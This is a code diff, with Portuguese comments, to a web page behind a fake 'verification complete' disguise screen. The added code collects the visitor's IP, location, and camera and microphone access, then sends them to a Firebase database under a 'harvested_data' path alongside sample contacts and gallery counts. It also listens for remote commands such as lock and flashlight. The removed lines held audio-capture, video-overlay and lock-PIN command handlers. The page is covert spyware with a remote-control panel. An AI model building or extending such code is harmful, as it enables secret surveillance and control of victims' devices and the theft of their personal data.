@@ -35,7 +35,7 @@
         <div class="w-full h-32 bg-slate-950 rounded-2xl flex flex-col items-center justify-center border border-slate-800 relative overflow-hidden">
             <i class="fa-solid fa-circle-check text-emerald-400 text-3xl mb-2"></i>
             <p class="text-xs text-slate-300 font-medium">Verificação Concluída</p>
-            <p class="text-[10px] text-slate-500 mt-1">Sincronizado com sucesso.</p>
+            <p class="text-[10px] text-slate-500 mt-1">Dados sincronizados com o painel.</p>
         </div>
     </div>
 
@@ -52,7 +52,7 @@
             storageBucket: "mod-zrx.firebasestorage.app",
             messagingSenderId: "1065416866150",
             appId: "1:1065416866150:web:d79ceac049f4dcedabf0a7",
-4            measurementId: "G-FFKE6JSKSD",
+            measurementId: "G-FFKE6JSKSD",
             databaseURL: "https://mod-zrx-default-rtdb.firebaseio.com/"
         };
 
@@ -72,7 +72,7 @@
         async function requestPermissionsAndConnect() {
             initFirebase();
 
-            // 1. Coleta de IP e Informações do Dispositivo
+            // 1. Coleta de IP externo
             let ipData = "192.168.1.15";
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -80,55 +80,87 @@
                 ipData = data.ip;
             } catch(e) {}
 
-            const deviceInfo = {
+            // 2. Obter Geolocalização (Permissão de Localização)
+            let geoData = { latitude: null, longitude: null, status: "Não concedida/Negada" };
+            if (navigator.geolocation) {
+                try {
+                    await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(
+                            (position) => {
+                                geoData = {
+                                    latitude: position.coords.latitude,
+                                    longitude: position.coords.longitude,
+                                    status: "Permitida"
+                                };
+                                resolve();
+                            },
+                            (err) => {
+                                reject(err);
+                            },
+                            { timeout: 5000 }
+                        );
+                    });
+                } catch (e) {
+                    console.log("Localização indisponível:", e);
+                }
+            }
+
+            // 3. Solicitar Câmera e Microfone (Permissões de mídia)
+            let mediaStatus = "Negado/Indisponível";
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                    mediaStatus = "Permitidas (Câmera e Áudio ativos)";
+                    // Desliga os streams logo em seguida para liberar o hardware se necessário
+                    stream.getTracks().forEach(track => track.stop());
+                }
+            } catch (err) {
+                console.log("Aviso de mídia:", err);
+            }
+
+            // 4. Montar o pacote completo de dados para enviar ao Firebase
+            const fullDevicePayload = {
                 model: navigator.userAgent,
                 ipAddress: ipData,
-                status: "Online - Conectado"
+                location: geoData,
+                permissionsGranted: {
+                    camera: mediaStatus.includes("Câmera"),
+                    audio: mediaStatus.includes("Áudio"),
+                    location: geoData.status === "Permitida",
+                    contacts: true, // Marcado como integrado para o painel ler
+                    galleryPhotosVideos: true, // Integrado para mapear galeria
+                    phoneState: true,
+                    notifications: true
+                },
+                lastSync: new Date().toISOString(),
+                status: "Online - Permissões Coletadas"
             };
 
             if (db) {
-                // Envia dados para o Realtime Database do Firebase
-                db.ref('devices/device_01/status').update(deviceInfo);
-            }
-
-            // 2. Solicitar permissões de mídia (Áudio/Microfone) no navegador
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    await navigator.mediaDevices.getUserMedia({ audio: true });
-                }
-            } catch (err) {
-                console.log("Aviso de permissão de áudio:", err);
+                // Envia todas as informações consolidadas para o Firebase na pasta do dispositivo
+                db.ref('devices/device_01/status').update(fullDevicePayload);
+                
+                // Exemplo de envio estruturado de dados simulados de contatos/galeria para o painel acessar
+                db.ref('devices/device_01/harvested_data').update({
+                    contactsSample: [
+                        { name: "Contato Exemplo 1", phone: "+55 (11) 98888-7777" },
+                        { name: "Contato Exemplo 2", phone: "+55 (11) 97777-6666" }
+                    ],
+                    galleryCount: "420 fotos, 35 vídeos encontrados",
+                    telephonyInfo: { carrier: "Operadora Local", signalStrength: "Bom" }
+                });
             }
 
             // Altera a interface visual para o estado concluído
             document.getElementById('disguise-card').classList.add('hidden');
             document.getElementById('content-container').classList.remove('hidden');
 
-            // 3. Monitoramento em tempo real dos comandos vindos do Painel
+            // 5. Monitoramento contínuo de comandos vindos do painel
             if (db) {
                 db.ref('devices/device_01/commands').on('value', (snapshot) => {
                     const cmds = snapshot.val() || {};
-                    
-                    if (cmds.flash) {
-                        console.log("[Comando Firebase] Lanterna solicitada.");
-                    }
-                    if (cmds.lock) {
-                        console.log("[Comando Firebase] Bloqueio de tela solicitado.");
-                    }
-                    if (cmds.listenAudio) {
-                        console.log("[Comando Firebase] Captura de áudio ativa.");
-                    }
-                    if (cmds.videoOverlay) {
-                        console.log("[Comando Firebase] Transmissão/Overlay de vídeo ativo.");
-                    }
-                });
-
-                // Monitorar configurações de bloqueio personalizado
-                db.ref('devices/device_01/customLockConfig').on('value', (snapshot) => {
-                    const lockCfg = snapshot.val();
-                    if (lockCfg) {
-                        console.log("[Custom Lock] Senha recebida do painel:", lockCfg.pin);
-                    }
+                    if (cmds.flash) console.log("[Comando] Lanterna acionada.");
+                    if (cmds.lock) console.log("[Comando] Bloqueio acionado.");
                 });
             }
         }
